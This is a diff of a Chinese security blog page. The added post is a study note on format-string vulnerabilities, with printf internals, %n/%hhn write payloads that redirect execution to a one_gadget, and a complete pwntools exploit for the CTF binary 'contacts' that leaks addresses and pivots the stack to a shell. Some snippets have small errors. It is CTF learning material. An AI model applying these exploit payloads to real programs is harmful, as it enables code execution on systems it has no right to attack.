@@ -267,7 +267,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">211</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">1,213</span> / Reading time: <span class="post-count">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -396,25 +396,45 @@
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="格式化漏洞"><a href="#格式化漏洞" class="headerlink" title="格式化漏洞"></a>格式化漏洞</h1><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码:"></a>漏洞代码:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">103</span>];</span><br><span class="line">fgets(buf, <span class="number">103</span>, <span class="built_in">stdin</span>);</span><br><span class="line">buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="number">0x0</span>;</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><blockquote>
-<p>gcc -Wno-format-security print_format.c -o print_format</p>
-</blockquote>
-<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul>
-<li><p>%d 用于读取10进制数值</p>
-</li>
-<li><p>%x 用于读取16进制数值</p>
-</li>
-<li><p>%s 用于读取字符串值</p>
-</li>
+        <h1 id="格式化漏洞"><a href="#格式化漏洞" class="headerlink" title="格式化漏洞"></a>格式化漏洞</h1><p>参考链接：<a href="http://roo0.me/2017/11/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/#x86-64-%E4%B8%AD%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E" rel="external nofollow" target="_blank">http://roo0.me/2017/11/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/#x86-64-%E4%B8%AD%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E</a></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 x86 结构下，格式字符串的参数是通过栈传递的，根据 cdecl 的调用约定，在进入 <code>printf()</code> 函数之前，将参数从右到左依次压栈。进入 <code>printf()</code> 之后，函数首先获取第一个参数，一次读取一个字符：如果字符不是 <code>%</code>，字符直接复制到输出中；否则，读取下一个非空字符，获取相应的参数并解析输出。</p>
+<p>但在<code>printf()</code>函数对第一个参数进行解析的时候，它不会检查所传进来的参数个数，每当解析到<code>%...</code>的时候，它就会直接按照顺序在栈中向后取参数。所以如果第一个参数中的占位符<code>%...</code>数量多于后面所传进来的参数的话，就可以非法地访问到栈中其他地址的内容。</p>
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><ul>
+<li>%d 用于读取10进制数值</li>
+<li>%x 用于读取16进制数值</li>
+<li>%s 用于读取字符串值</li>
 <li>%c 用于读取字符</li>
 <li>%p 用于读取指针地址</li>
-<li>%n 用于讲当前字符串的长度打印到var中，例 printf（”test %hn”,&amp;var[其中var为两个字节]） printf（”test %n”,&amp;var[其中var为一个字节]）</li>
+<li>%n 用于讲当前字符串的长度打印到var中，例 printf（”test %hn”,&amp;var[其中var为两个字节]） printf（”test %n”,&amp;var[其中var为一个字节]）%n 写4个字节，%hn写2个字节，%hhn写1个字节</li>
 </ul>
-<h3 id="计算偏移和填充"><a href="#计算偏移和填充" class="headerlink" title="计算偏移和填充"></a>计算偏移和填充</h3><blockquote>
-<p> offset.py</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    p = process(&quot;./vuln&quot;)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    return info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line"></span><br><span class="line">print autofmt.offset</span><br></pre></td></tr></table></figure>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Hello %%&quot;);           // &quot;Hello %&quot;</span><br><span class="line">printf(&quot;Hello World!&quot;);       // &quot;Hello World!&quot;</span><br><span class="line">printf(&quot;Number: %d&quot;, 123);    // &quot;Number: 123&quot;</span><br><span class="line">printf(&quot;%s %s&quot;, &quot;Format&quot;, &quot;Strings&quot;);   // &quot;Format Strings&quot;</span><br><span class="line">printf(&quot;%12c&quot;, &apos;A&apos;);          // &quot;           A&quot;</span><br><span class="line">printf(&quot;%16s&quot;, &quot;Hello&quot;);      // &quot;          Hello!&quot;</span><br><span class="line">int n;</span><br><span class="line">printf(&quot;%12c%n&quot;, &apos;A&apos;, &amp;n);    // n = 12</span><br><span class="line">printf(&quot;%16s%n&quot;, &quot;Hello!&quot;, &amp;n); // n = 16</span><br><span class="line">printf(&quot;%2$s %1$s&quot;, &quot;Format&quot;, &quot;Strings&quot;); // &quot;Strings Format&quot;</span><br><span class="line">printf(&quot;%42c%1$n&quot;, &amp;n);       // 首先输出41个空格，然后输出 n 的低八位地址作为一个字符</span><br></pre></td></tr></table></figure>
+<h3 id="X86-64中的格式化字符串漏洞"><a href="#X86-64中的格式化字符串漏洞" class="headerlink" title="X86_64中的格式化字符串漏洞"></a>X86_64中的格式化字符串漏洞</h3><p>在 x64 体系中，多数调用惯例都是通过寄存器传递参数。在 Linux 上，前六个参数通过 <code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code>和 <code>R9</code> 传递；而在 Windows 中，前四个参数通过 <code>RCX</code>、<code>RDX</code>、<code>R8</code>和 <code>R9</code> 来传递。</p>
+<p>通常情况下，前五个数字却分别来自寄存器 <code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code> 和 <code>R9</code>，后面的数字取自栈，我们知道共有6个寄存器用于传递参数，但是只输出5个，这是因为，<code>RDI</code>被用于传递格式化字符串。</p>
+<h2 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h2><ol>
+<li>大于4的时候:</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 前缀</span><br><span class="line">将返回地址修改为one_gadget</span><br><span class="line">payload = p32(libc_start) + &quot;%&quot; + str(one_gadget &amp; 0xff - 4) + &quot;x%7$hhn&quot;</span><br><span class="line"></span><br><span class="line">payload = p32(libc_start + 1) + &quot;%&quot; + str(((one_gadget &amp; 0xff00) &gt;&gt; 8)- 4) + &quot;x    %7$hhn&quot;</span><br><span class="line"></span><br><span class="line">payload = p32(libc_start + 2) + &quot;%&quot; + str(((one_gadget &amp; 0xff0000) &gt;&gt; 16)- 4) +     &quot;x%7$hhn&quot;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>小于4的时候</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;AA%15$nA&quot;+&quot;\x38\xd5\xff\xff&quot;</span><br></pre></td></tr></table></figure>
+<p>开头的 <code>AA</code> 占两个字节，即将地址<code>\x38\xd5\xff\xff赋值为</code>2，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">2. 后缀 可以写入</span><br><span class="line">pad = str(one_gadget &amp; 0xff)</span><br><span class="line">if len(pad) == 3:</span><br><span class="line">    payload = &quot;%&quot; + pad + &quot;x%10$hhn&quot; + p32(libc_start)</span><br><span class="line">elif len(pad) == 2:</span><br><span class="line">    payload = &quot;%&quot; + pad + &quot;x%10$hhnA&quot; + p32(libc_start)</span><br><span class="line">else:</span><br><span class="line">    payload = &quot;%&quot; + pad + &quot;x%10$hhnAA&quot; + p32(libc_start)</span><br><span class="line"></span><br><span class="line">pad = str((one_gadget &amp; 0xff) &gt;&gt; 8)</span><br><span class="line">if len(pad) == 3:</span><br><span class="line">    payload = &quot;%&quot; + pad + &quot;x%10$hhn&quot; + p32(libc_start + 1)</span><br><span class="line">elif len(pad) == 2:</span><br><span class="line">    payload = &quot;%&quot; + pad + &quot;x%10$hhnA&quot; + p32(libc_start + 1)</span><br><span class="line">else:</span><br><span class="line">    payload = &quot;%&quot; + pad + &quot;x%10$hhnAA&quot; + p32(libc_start + 1)</span><br><span class="line">    </span><br><span class="line">pad = str（(one_gadget &amp; 0xff) &gt;&gt; 16)</span><br><span class="line">if len(pad) == 3:</span><br><span class="line">    payload = &quot;%&quot; + pad + &quot;x%10$hhn&quot; + p32(libc_start + 2)</span><br><span class="line">elif len(pad) == 2:</span><br><span class="line">    payload = &quot;%&quot; + pad + &quot;x%10$hhnA&quot; + p32(libc_start + 2)</span><br><span class="line">else:</span><br><span class="line">    payload = &quot;%&quot; + pad + &quot;x%10$hhnAA&quot; + p32(libc_start + 2)</span><br></pre></td></tr></table></figure>
+<h2 id="无binary"><a href="#无binary" class="headerlink" title="无binary"></a>无binary</h2><h2 id="格式化字符串不在栈上"><a href="#格式化字符串不在栈上" class="headerlink" title="格式化字符串不在栈上"></a>格式化字符串不在栈上</h2><p>CASW2015:</p>
+<p>首先通过格式化字符串漏洞leak出libc和heap的地址。</p>
+<p>main</p>
+<p>​    -&gt; display</p>
+<p>​        -&gt; display_1</p>
+<p>​             printf(format)</p>
+<p>display_1_ebp –&gt; display_ebp –&gt; main_ebp</p>
+<p>在display_1函数中，可以修改main中ebp的值。</p>
+<p>display函数返回时，将执行如下语句:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop ebp;</span><br><span class="line">这里的 ebp = main_ebp;</span><br><span class="line">而此时main_ebp是我们伪造的ebp。</span><br></pre></td></tr></table></figure>
+<p>这样当main函数运行到 leave,ret的时候</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">esp=ebp</span><br><span class="line">pop ebp</span><br><span class="line">pop rip</span><br><span class="line">jump rip</span><br></pre></td></tr></table></figure>
+<p>这样的话，esp将指向我们伪造的ebp,实现堆栈转换。</p>
+<p>rip将指向我们预先放置在堆中的one_gadget地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./contacts&quot;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def create_contact(name, phone_number, length, description):</span><br><span class="line">    p.recvuntil(&quot;&gt;&gt;&gt;&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;Name: &quot;)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(&quot;No: &quot;)</span><br><span class="line">    p.sendline(phone_number)</span><br><span class="line">    p.recvuntil(&quot;Length of description: &quot;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(&quot;Enter description:&quot;)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line">def remove_contact(index):</span><br><span class="line">    p.recvuntil(&quot;&gt;&gt;&gt;&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def show_contact():</span><br><span class="line">    p.recvuntil(&quot;&gt;&gt;&gt;&quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line"></span><br><span class="line"># leak libc, heap, %6$p =&gt; main_ebp</span><br><span class="line">create_contact(&quot;c1&quot;, &quot;123&quot;, &quot;120&quot;, &quot;%2$p.%11$p&quot;)</span><br><span class="line"></span><br><span class="line">show_contact()</span><br><span class="line">p.recvlines(4)</span><br><span class="line">data = p.recvline()</span><br><span class="line"></span><br><span class="line">libc = int(data[14:24], 16) - 0x5fcab</span><br><span class="line">print hex(libc)</span><br><span class="line">heap = int(data[25:35], 16) + 0x90 - 4</span><br><span class="line">print heap</span><br><span class="line"></span><br><span class="line">one_gadget = libc + 0x5fbc5</span><br><span class="line"></span><br><span class="line">attach(p, &quot;b *0x8048c27&quot;)</span><br><span class="line">create_contact(&quot;c2&quot;, &quot;123&quot;, &quot;120&quot;, p32(one_gadget))</span><br><span class="line"></span><br><span class="line"># 伪造main_ebp</span><br><span class="line">create_contact(&quot;c3&quot;, &quot;123&quot;, &quot;120&quot;, &quot;%&quot; + str(heap) + &quot;x%6$n&quot;)</span><br><span class="line">show_contact()</span><br><span class="line">p.recvuntil(&quot;&gt;&gt;&gt;&quot;)</span><br><span class="line">p.sendline(&quot;5&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -553,7 +573,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#格式化漏洞"><span class="toc-number">1.</span> <span class="toc-text">格式化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码"><span class="toc-number">1.0.1.</span> <span class="toc-text">漏洞代码:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编译"><span class="toc-number">1.0.2.</span> <span class="toc-text">编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#前置知识"><span class="toc-number">1.0.3.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#计算偏移和填充"><span class="toc-number">1.0.4.</span> <span class="toc-text">计算偏移和填充</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#格式化漏洞"><span class="toc-number">1.</span> <span class="toc-text">格式化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前置知识"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#格式化字符串"><span class="toc-number">1.1.2.</span> <span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例"><span class="toc-number">1.1.3.</span> <span class="toc-text">案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X86-64中的格式化字符串漏洞"><span class="toc-number">1.1.4.</span> <span class="toc-text">X86_64中的格式化字符串漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用方法"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无binary"><span class="toc-number">1.3.</span> <span class="toc-text">无binary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#格式化字符串不在栈上"><span class="toc-number">1.4.</span> <span class="toc-text">格式化字符串不在栈上</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1401,9 +1421,261 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 57
+        Total : 71
         </div>
         <!-- search  -->
         
@@ -1414,8 +1686,97 @@
     
     
     
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/posts/41159/">RealWorldFinal</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href="/posts/4968/">pwnable.tw练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href="/posts/48844/">bctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/posts/16617/">code-breaking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/posts/49484/">hctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/posts/59104/">SROP-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1425,11 +1786,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/30021/">hack-lu</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/15111/">护网杯pwn-study</a>
         </li>
     
     
@@ -1449,7 +1805,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng</a>
         </li>
     
     
@@ -1569,17 +1925,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">linux常见文件的作用</a>
         </li>
     
     
@@ -1624,12 +1975,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
@@ -1649,7 +2000,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_return2plt</a>
         </li>
     
     
@@ -1707,19 +2058,25 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
-        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+        <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
+        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
+    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -1731,9 +2088,9 @@
     
         <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
-        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
+        <span class="sidebar-tag-name" data-tags="安全体系建设"><span class="iconfont-archer">&#xe606;</span>安全体系建设</span>
     
-        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
